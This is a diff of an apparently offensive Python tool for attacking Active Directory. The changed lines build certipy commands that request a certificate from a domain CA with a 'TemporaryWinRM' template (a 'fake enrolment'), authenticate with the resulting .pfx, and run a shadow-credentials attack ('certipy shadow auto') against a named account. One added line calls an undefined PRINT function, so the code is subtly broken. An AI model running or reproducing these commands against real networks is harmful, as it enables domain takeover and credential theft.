@@ -4877,6 +4877,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '607':
+      PRINT("EXPLOIT NEEDS UPDATING") 
       AD1 = input("[?] Please enter account user's name: ").strip()
       SKEW = timeSync(SKEW)
       print(colored("[*] Checking current account status...", colour3)) 
@@ -5506,7 +5507,7 @@ while True:
       if methodSelect[:1]=="1":
          try:
             print("[i] Using ticket as credential...")      
-            localCOM("certipy req -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k " + TGT.rstrip(" ") + " -target " + SDM.rstrip(" ") + " -dc-host " + SDM.rstrip(" ") + " -dc-ip " + TIP.rstrip(" ") + " -ca " + getCert1.rstrip(" ") + " -template TemporaryWinRM")
+            localCOM("certipy req -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -target " + SDM.rstrip(" ") + " -dc-host " + SDM.rstrip(" ") + " -dc-ip " + TIP.rstrip(" ") + " -ca " + getCert1.rstrip(" ") + " -template TemporaryWinRM")
             print(colored("\n[*] Fake enrolment created...", colour3))
             localCOM("certipy auth -pfx " + USR.rstrip(" ") + ".pfx -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -username " + USR.rstrip() + " ")
          except:
@@ -5612,7 +5613,7 @@ while True:
       if methodSelect[:1]=="1":
          try:
             print("[i] Using ticket as credential...")  
-            localCOM("certipy shadow auto -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k " + TGT.rstrip(" ") + " -account " +  AD1 + " -dc-ip " + TIP.rstrip(" "))
+            localCOM("certipy shadow auto -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -account " +  AD1 + " -dc-ip " + TIP.rstrip(" "))
          except:
             print(f"[-] Failed to check misconfigurations using ticket...")
       if methodSelect[:1]=="2":
